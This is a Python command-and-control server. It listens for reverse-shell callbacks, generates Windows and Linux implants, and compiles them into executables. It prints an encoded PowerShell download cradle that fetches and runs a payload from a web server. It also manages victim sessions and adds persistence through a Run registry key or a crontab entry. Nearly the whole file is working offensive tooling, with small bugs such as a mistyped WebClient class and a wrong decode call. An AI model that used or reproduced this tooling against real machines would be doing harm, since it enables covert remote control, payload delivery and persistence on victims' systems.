import base64
import os
import random
import shutil
import socket
import string
import subprocess
import threading
import time
from datetime import datetime

from rich.console import Console
from rich.table import Table


def winplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}/winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation.')


def linplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}/linplant.py'):
        print(f'{check_cwd}')
        shutil.copy('linplant.py', file_name)
    else:
        print(f'[-] {check_cwd} / linplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occurred with generation.')


def exeplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'{random_name}.py'
    exe_file = f'{random_name}.exe'
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}/winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[-] winplant.py file not found.')
    with open(file_name) as f:
        new_host = f.read().replace('INPUT_IP_HERE', host_ip)
    with open(file_name, 'w') as f:
        f.write(new_host)
        f.close()
    with open(file_name) as f:
        new_port = f.read().replace('INPUT_PORT_HERE', host_port)
    with open(file_name, 'w') as f:
        f.write(new_port)
        f.close()
    if os.path.exists(f'{file_name}'):
        print(f'[+] {file_name} saved to {check_cwd}')
    else:
        print('[-] Some error occured during generation')

    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    os.remove(f'{random_name}.spec')
    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}/{exe_file}'):
        print(f'[+] {exe_file} saved to current directory.')
    else:
        print('[-] Some error occured during generation.')


def powershell_cradle():
    web_server_ip = input('[+] Web server host: ')
    web_server_port = input('[+] Web server port: ')
    payload_name = input('[+] Payload name: ')
    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    runner_file = f'{runner_file}.txt'
    randomized_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
    randomized_exe_file = f'{randomized_exe_file}.exe'
    print(
        f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')

    runner_cal_unecoded = f"iex (new-object new.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode(
        'utf-16le')
    with open(runner_file, 'w') as f:
        f.write(
            f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')
        f.close()
    b64_runner_cal = base64.b64encode(runner_cal_unecoded)
    b64_runner_cal = b64_runner_cal.decode()
    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')
    b64_runner_cal_decoded = base64.b16decode(b64_runner_cal).decode()
    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')
    return


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    # communication_handler()
    print('Prethread')
    t1 = threading.Thread(target=communication_handler)
    print('Starting thread')
    t1.start()


def help():
    print('''
    Commands
    ---------------------------------
    Listener Commands
    ---------------------------------------------------------------------------------------
    listeners -g --generate           --> Generate Listener
    
    Session Commands
    ---------------------------------------------------------------------------------------
    sessions -l --list                --> List Sessions
    sessions -i --interact            --> Interact with Session
    sessions -k --kill <value>        --> Kill Active Session
    
    Payload Commands
    ---------------------------------------------------------------------------------------
    winplant py                       --> Windows Python Implant
    winplang go                       --> Windows Golang Implant
    exeplant go                       --> Windows Executable Implant (Golang)
    exeplant py                       --> Windows Executable Implant (Python)
    linplant py                       --> Linux Python Implant
    linplang go                       --> Linux Golang Implant
    pshell_shell                      --> Powershell Implant
    
    Client Commands
    ---------------------------------------------------------------------------------------
    persist / pt                      --> Persist Payload (After Interacting with Session) 
    background / bg                   --> Background Session
    exit                              --> Kill Client Connection
    
    Misc Commands
    ---------------------------------------------------------------------------------------
    help / h                          --> Show Help Menu
    clear / cls                       --> Clear Screen
    ''')


def target_comm_channel(target_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
        if len(message) == 0:
            continue
        if message == 'help':
            pass
        communication_out(target_id, message)
        if message == 'exit':
            message = base64.b64encode(message.encode())
            target_id.send(message.encode())
            target_id.close()
            targets[num][7] = 'Dead'
            break
        elif message == 'background':
            break
        elif message == 'persist':
            payload_name = input('[+] Enter the name of the payload to add to autorun: ')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                persist_command_1 = base64.b64encode(persist_command_1.encode())
                target_id.send(persist_command_1)
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                persist_command_2 = base64.b64encode(persist_command_2.encode())
                target_id.send(persist_command_2)
                print(
                    '[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
            elif targets[num][6] == 2:
                persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                persist_command = base64.b64encode(persist_command.encode())
                target_id.send(persist_command)
                print('[+] Run this command to clean up the crontab: \n crontab -r')
        else:
            response = communication_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                target_id.close()
                break

            print(response)


def communication_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            # remote_target.setblocking(False)

            username = remote_target.recv(1024).decode()
            username = base64.b64decode(username).decode()
            admin = remote_target.recv(1024).decode()
            admin = base64.b64decode(admin).decode()
            op_sys = remote_target.recv(1024).decode()
            op_sys = base64.b64decode(op_sys).decode()
            if admin == 1:
                admin_value = 'Yes'
            elif username == 'root':
                admin_value = 'Yes'
            else:

                admin_value = 'No'

            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2
            current_time = time.strftime("%H:%M:%S", time.localtime())

            date = datetime.now()

            time_record = (f"{date.month}/{date.day}/{date.year} {current_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])

            if host_name is not None:
                targets.append(
                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys,
                     pay_val, 'Active'])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append(
                    [remote_target, remote_ip[0], time_record, username, admin_value, op_sys, pay_val, 'Active'])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass


def communication_in(target_id):
    print('[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response


def communication_out(target_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    target_id.send(message)


def kill_sig(target_id, message):
    message = str(message)
    message = base64.b64encode(bytes(message, encoding='utf-8'))
    target_id.send(message)


def banner():
    print(
        '                                                                                                                                                           _..._                   ')
    print(
        '                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
    print(
        '             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
    print(
        '           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
    print(
        '          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
    print(
        '           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
    print(
        '       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
    print(
        '     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
    print(
        '    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
    print(
        '  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
    print(
        '.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
    print(
        '.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
    print(
        '           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')


if __name__ == '__main__':
    banner()
    targets = []
    listener_counter = 0
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            command = input('Enter command#> ')
            if command == 'help':
                help()
            if command == 'exit':
                quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
                if quit_message == 'y':
                    targets_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            communication_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_counter > 0:
                        sock.close()
                    break
                else:
                    continue
            if command == 'listeners -g':
                host_ip = input('[+] Enter the IP address to listen on: ')
                host_port = input('[+] Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'exeplant':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[-] You cannot generate a payload without an active listener.')
            if command == 'pshell_shell':
                powershell_cradle()
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    table = Table(title="Sessions")
                    table.add_column("Session", justify="center", style="cyan", no_wrap=True)
                    table.add_column("Status", justify="center", style="cyan", no_wrap=True)
                    table.add_column("Username", justify="center", style="cyan", no_wrap=True)
                    table.add_column("Admin", justify="center", style="cyan", no_wrap=True)
                    table.add_column("Target", justify="center", style="cyan", no_wrap=True)
                    table.add_column("OS", justify="center", style="cyan", no_wrap=True)
                    table.add_column("Status", justify="center", style="cyan", no_wrap=True)
                    # myTable = PrettyTable()
                    # myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Check-In Time']
                    # myTable.padding_width = 3
                    for target in targets:
                        if target[7] == 'Active':
                            table.add_row(str(session_counter), target[7], target[3], target[4], target[1], target[5],
                                          target[2], style='green')
                        else:
                            table.add_row(str(session_counter), target[7], target[3], target[4], target[1], target[5],
                                          target[2], style='red')
                        session_counter += 1
                    # print(myTable)
                    console = Console()
                    console.print(table)
                if command.split(" ")[1] == '-i':
                    try:
                        num = int(command.split(" ")[2])
                        target_id = (targets[num])[0]
                        if (targets[num][7]) == 'Active':
                            target_comm_channel(target_id, targets, num)
                        else:
                            print('[-] You cannot interact with a dead session.')
                    except IndexError:
                        print(f'[-] Session {num} does not exist')
            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    target_id = (targets[num])[0]
                    kill_sig(target_id, 'exit')
                    targets[num][7] = 'Dead'
                    print(f'[+] Session {num} terminated.')
                except (IndexError, ValueError):
                    print(f'[-] Session {num} does not exist.')
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
            if quit_message == 'y':
                targets_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        communication_out(target[0], 'exit')
                    communication_out(target[0], 'exit')
                kill_flag = 1
                if listener_counter > 0:
                    sock.close()
                print('[+] You can close this window now.')
                break
            else:
                continue
